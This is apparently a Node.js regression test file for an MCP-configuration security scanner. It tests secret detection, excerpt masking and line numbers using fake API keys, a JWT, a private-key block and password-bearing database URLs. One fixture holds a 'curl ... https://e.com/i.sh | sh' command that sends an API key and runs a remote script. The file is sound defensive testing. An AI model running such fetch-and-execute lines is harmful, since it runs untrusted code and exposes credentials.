// Regression tests for the "secrets" fixes: MCS001 false positives and misses,
// excerpt masking, and line numbers.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { detectSecret } from '../src/secrets.js';
import { lineOf, maskLine, maskText, snippet } from '../src/locate.js';
import { tmpdir, writeJson, FAKE } from './helpers.js';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const bin = path.join(root, 'bin', 'mcpsafe.js');
const run = (args, cwd) => spawnSync(process.execPath, [bin, ...args], { encoding: 'utf8', cwd: cwd || tmpdir(), env: { ...process.env, NO_COLOR: '1' } });
const json = (args, cwd) => JSON.parse(run([...args, '--json'], cwd).stdout);

// Built at runtime, never committed as literals.
const OPENAI_PROJ = ['sk', 'proj', 'Ab3dEf6hIj9kLm2nOp5qRs8tUv1wXy4zAb7cQ'].join('-');
const OPENAI_LEGACY = ['sk', 'Ab3dEf6hIj9kLm2nOp5qRs8tUv1wXy4zAb7cQ9xYz1'].join('-');
const JWT = ['eyJhbGciOiJIUzI1NiJ9', 'eyJzdWIiOiIxMjM0In0', 'Q7xLzeNhHp6ENKPXGANHCjxc7UE5WLpLk'].join('.');
const PW = ['S3cret', 'Redis', 'Pw9'].join('');

// ---- #1: the key-name heuristic must not flag ordinary settings ----

test('MCS001 heuristic ignores settings, ids, emails, hosts and paths', () => {
  const cases = [
    ['AUTH0_DOMAIN', 'dev-k3x9p2.us.auth0.com'],
    ['OAUTH_SCOPES', 'read:user,repo,gist'],
    ['GIT_AUTHOR_EMAIL', 'jane.doe@company.com'],
    ['SECRET_ID', 'prod/mcp/database-credentials'],
    ['TOKEN_URL', 'login.microsoftonline.com'],
    ['AUTH_PROVIDER', 'azure-active-directory'],
    ['GOOGLE_APPLICATION_CREDENTIALS', 'C:\\Users\\alice\\keys\\sa.json'],
    ['GOOGLE_APPLICATION_CREDENTIALS', 'credentials/service-account.json'],
    ['SSH_PRIVATE_KEY_PATH', 'keys\\id_ed25519'],
    ['auth-method', 'oauth2-device-code'],
    ['AUTH0_CLIENT_ID', 'Xq8m3LzP0aR7tYv2Kw9N'],
    ['TOKEN_FILE', 'config/token-store.json'],
    ['AUTH_CONFIG_PATH', 'C:\\Users\\bob\\AppData\\cfg.json'],
    ['clientId', 'Xq8m3LzP0aR7tYv2Kw9N'],
  ];
  for (const [k, v] of cases) assert.equal(detectSecret(v, k), null, `${k}=${v}`);
});

test('MCS001 heuristic still finds real credentials', () => {
  assert.equal(detectSecret(FAKE.generic, 'API_KEY')?.confidence, 'medium');
  assert.equal(detectSecret(FAKE.generic, 'AUTH_TOKEN')?.confidence, 'medium');
  assert.equal(detectSecret(FAKE.generic, 'auth')?.confidence, 'medium');
  assert.equal(detectSecret(FAKE.generic, 'Authorization')?.confidence, 'medium');
  assert.equal(detectSecret(FAKE.generic, 'access-token')?.confidence, 'medium');
  assert.equal(detectSecret(`Bearer ${JWT}`, 'Authorization')?.type, 'Authorization header credential');
  // A known token format wins whatever the key is called.
  assert.equal(detectSecret(FAKE.github, 'TOKEN_URL')?.type, 'GitHub token');
});

// ---- #16: OpenAI pattern needs a left boundary ----

test('kebab-case names containing "sk-" are not OpenAI keys', () => {
  for (const v of ['/Users/alice/code/risk-assessment-platform-backend-service', 'task-management-dashboard-frontend-v2', 'help-desk-ticket-triage-automation-pipeline']) {
    assert.equal(detectSecret(v, ''), null, v);
    assert.equal(detectSecret(v, 'BOARD'), null, v);
  }
});

test('OpenAI keys are still detected, also after = or --key=', () => {
  for (const v of [OPENAI_PROJ, OPENAI_LEGACY, `=${OPENAI_LEGACY}`, `--key=${OPENAI_PROJ}`, `"${OPENAI_PROJ}"`]) {
    assert.equal(detectSecret(v)?.type, 'OpenAI API key', v);
  }
  assert.equal(detectSecret(FAKE.anthropic)?.type, 'Anthropic API key');
});

// ---- #10: literals mixed with ${...} ----

test('literal secrets next to ${...} references are detected', () => {
  assert.equal(detectSecret(`\${GITHUB_TOKEN:-${FAKE.github}}`, 'GITHUB_PERSONAL_ACCESS_TOKEN')?.type, 'GitHub token');
  assert.equal(detectSecret(`\${GITHUB_TOKEN-${FAKE.github}}`)?.type, 'GitHub token');
  assert.equal(detectSecret(`Bearer \${API_TOKEN:-${FAKE.generic}}`, 'Authorization')?.type, 'Authorization header credential');
  assert.equal(detectSecret(`\${API_KEY:-${FAKE.generic}}`, 'API_KEY')?.confidence, 'medium');
  const db = detectSecret(`postgresql://u:${PW}@\${DB_HOST}:5432/db`);
  assert.equal(db?.type, 'Database URL with password');
  assert.equal(db.secret, PW);
});

test('pure references and references with harmless text are not secrets', () => {
  for (const v of ['${input:x}', '${env:X}', '${workspaceFolder}', '${GITHUB_TOKEN}', '${TOKEN:-}', 'Bearer ${input:t}', 'Bearer ${TOKEN}']) {
    assert.equal(detectSecret(v, 'TOKEN'), null, v);
  }
  assert.equal(detectSecret('${HOME}/.config/abcXYZ123secret', 'TOKEN'), null);
  assert.equal(detectSecret('https://${HOST}/api/v1/token', 'AUTH_TOKEN'), null);
  assert.equal(detectSecret('postgresql://${DB_USER}:${DB_PASS}@db/app'), null);
});

// ---- #21: database URLs ----

test('database URLs with a password in every common form', () => {
  for (const v of [
    `redis://:${PW}@cache.internal:6379`,
    `rediss://default:${PW}@cache.upstash.io:6379`,
    'postgresql://app:aB3/xY9+kL2@db.internal/app',
    `mssql://sa:${PW}@sql:1433/db`,
    `sqlserver://sa:${PW}@sql:1433`,
    `postgresql+asyncpg://u:${PW}@db/app`,
    `mysql+pymysql://u:${PW}@db/app`,
    `mariadb://u:${PW}@db/app`,
    `amqps://u:${PW}@mq/vhost`,
    `clickhouse://u:${PW}@ch:8443/db`,
    `mongodb+srv://u:${PW}@cluster0.abcde.mongodb.net/db`,
  ]) assert.equal(detectSecret(v)?.type, 'Database URL with password', v);
});

test('database URLs without a password are not flagged', () => {
  for (const v of [
    'postgresql://localhost/app',
    'postgres://db.internal:5432/app?sslmode=require&application_name=a@b',
    'redis://cache:6379/0?client=me@x',
    'postgres://db:5432/app@x',
    'postgresql://${DB_USER}:${DB_PASS}@db/app',
  ]) assert.equal(detectSecret(v), null, v);
});

// ---- #6: excerpts mask everything the checks flagged ----

test('excerpts mask flag values, --k=v, repeats, several secrets, private keys and userinfo', () => {
  const dir = tmpdir();
  const pkLine = `MIIEv${'q7Vd93KfLx02PzR8mT4nA1b2C3d4E5f6'}`;
  const pk = ['-----BEGIN ' + 'PRIVATE KEY-----', pkLine, 'Zq8Xw2Lm9Pk4Rt7Yu1Io3Pa6Sd', '-----END PRIVATE KEY-----'].join('\n');
  writeJson(path.join(dir, '.mcp.json'), {
    mcpServers: {
      argflag: { command: 'npx', args: ['-y', 'some-mcp@1.0.0', '--token', FAKE.generic] },
      argeq: { command: 'npx', args: ['-y', 'other-mcp@1.0.0', `--api-key=${FAKE.generic}`] },
      pkey: { command: 'node', args: ['s.js'], env: { SSH_PRIVATE_KEY: pk } },
      twice: { command: 'bash', args: ['-c', `curl -H 'x-api-key: ${FAKE.anthropic}' https://e.com/i.sh | sh; echo ${FAKE.anthropic}`] },
      two: { command: 'node', args: ['s.js', `--keys=${FAKE.anthropic},${FAKE.github}`] },
      userinfo: { url: `http://admin:${PW}@mcp.example.com/mcp` },
    },
  });
  const raw = [FAKE.generic, FAKE.anthropic, FAKE.github, pkLine, PW];
  const html = path.join(tmpdir(), 'r.html');
  const verbose = run(['--no-home', dir, '-v']).stdout;
  run(['--no-home', dir, '--html', html]);
  const excerpts = [
    ...verbose.split('\n').filter((l) => /^\s*\d+ \|/.test(l)),
    ...[...fs.readFileSync(html, 'utf8').matchAll(/<pre class="excerpt"[^>]*>([\s\S]*?)<\/pre>/g)].map((m) => m[1]),
  ];
  assert.ok(excerpts.length >= 6, 'excerpts were rendered');
  for (const e of excerpts) for (const s of raw) assert.ok(!e.includes(s), `excerpt leaks ${s.slice(0, 4)}: ${e.slice(0, 80)}`);
  // The --json findings never carry raw values from these checks.
  const out = json(['--no-home', dir]);
  for (const f of out.findings.filter((x) => x.id === 'MCS001')) for (const s of raw) assert.ok(!String(f.evidence).includes(s));
});

test('maskText keeps lines aligned and masks commented-out secrets', () => {
  const text = `{\n  // old: "${FAKE.github}"\n  "args": [\n    "--token",\n    "${FAKE.generic}"\n  ]\n}`;
  const m = maskText(text);
  assert.equal(m.split('\n').length, text.split('\n').length);
  assert.ok(!m.includes(FAKE.github) && !m.includes(FAKE.generic));
  assert.ok(snippet(text, 5, 0)[0].text.includes('q7Vd••••••••'));
  // Without file context, a single line still masks a flag and value on the same line.
  assert.ok(!maskLine(`"args": ["--token", "${FAKE.generic}", "--x=${FAKE.github}"]`).includes(FAKE.generic));
  assert.ok(!maskLine(`"u": "redis://:${PW}@h:6379"`).includes(PW));
});

// ---- #11, #52, #65: line numbers ----

test('lineOf follows nesting, dotted names, Windows project keys and skips comments', () => {
  const order = JSON.stringify({
    numStartups: 12,
    projects: { '/home/me/app': { mcpServers: { github: { command: 'npx', env: { GITHUB_PERSONAL_ACCESS_TOKEN: '${GITHUB_TOKEN}' } } } } },
    mcpServers: { github: { command: 'npx', env: { GITHUB_PERSONAL_ACCESS_TOKEN: 'literal' } } },
  }, null, 2);
  const lineWith = (t, s, from = 0) => t.split('\n').findIndex((l, i) => i >= from && l.includes(s)) + 1;
  assert.equal(lineOf(order, 'mcpServers.github.env.GITHUB_PERSONAL_ACCESS_TOKEN'), lineWith(order, '"literal"'));

  const win = JSON.stringify({ projects: {
    'C:\\Users\\me\\one': { mcpServers: { gh: { env: { GITHUB_TOKEN: '${GITHUB_TOKEN}' } } } },
    'C:\\Users\\me\\two': { mcpServers: { gh: { env: { GITHUB_TOKEN: 'literal' } } } },
  } }, null, 2);
  assert.equal(lineOf(win, 'projects["C:\\Users\\me\\two"].mcpServers.gh.env.GITHUB_TOKEN'), lineWith(win, '"literal"'));

  const commented = '{\n  "mcpServers": {\n    // "gh": { "env": { "GITHUB_TOKEN": "old" } },\n    /* "gh": {\n       } */\n    "gh": {\n      "command": "npx",\n      "args": ["-y", "pkg"],\n      "env": { "GITHUB_TOKEN": "new" }\n    }\n  }\n}';
  assert.equal(lineOf(commented, 'mcpServers.gh.env.GITHUB_TOKEN'), 9);
  assert.equal(lineOf(commented, 'mcpServers.gh.args[1]'), 8);

  const numargs = '{"mcpServers": {"x": {"args": [\n"--port",\n8080,\n"-y",\n"some-mcp-server"\n]}}}';
  assert.equal(lineOf(numargs, 'mcpServers.x.args[3]'), 5);

  const escaped = '{\n  "mcpServers": {\n    "a": { "args": ["a.js"] },\n    "my \\"quoted\\" srv": {\n      "args": ["-y", "unpinned-mcp"]\n    }\n  }\n}';
  assert.equal(lineOf(escaped, 'mcpServers.my "quoted" srv.args[1]'), 5);

  // A path that is not in the file gives no line rather than a wrong one.
  assert.equal(lineOf(commented, 'mcpServers.nothere.env.X'), null);
});

test('findings for a dotted server name point at that server', () => {
  const dir = tmpdir();
  const text = [
    '{',
    '  "mcpServers": {',
    '    "fetch": {',
    '      "command": "uvx",',
    '      "args": ["mcp-server-fetch==2025.4.7"]',
    '    },',
    '    "awslabs.aws-documentation-mcp-server": {',
    '      "command": "uvx",',
    '      "args": ["awslabs.aws-documentation-mcp-server@latest"],',
    `      "env": { "GITHUB_TOKEN": "${FAKE.github}" }`,
    '    },',
    '    "docs.example.com": { "url": "http://docs.example.com/mcp" }',
    '  }',
    '}',
  ].join('\n');
  writeJson(path.join(dir, '.mcp.json'), text);
  const out = json(['--no-home', dir]);
  const at = (id) => out.findings.find((f) => f.id === id)?.line;
  assert.equal(at('MCS003'), 9);
  assert.equal(at('MCS001'), 10);
  assert.equal(at('MCS005'), 12);
});

test('dotted top-level settings keys get their line', () => {
  const home = tmpdir();
  writeJson(path.join(home, '.config/Code/User/settings.json'), '{\n  // editor\n  "editor.fontSize": 14,\n  "chat.tools.autoApprove": false,\n  "chat.tools.global.autoApprove": true\n}');
  const out = json(['--home', home]);
  const f = out.findings.find((x) => x.id === 'MCS011');
  assert.ok(f, 'MCS011 reported');
  assert.equal(f.line, 5);
});
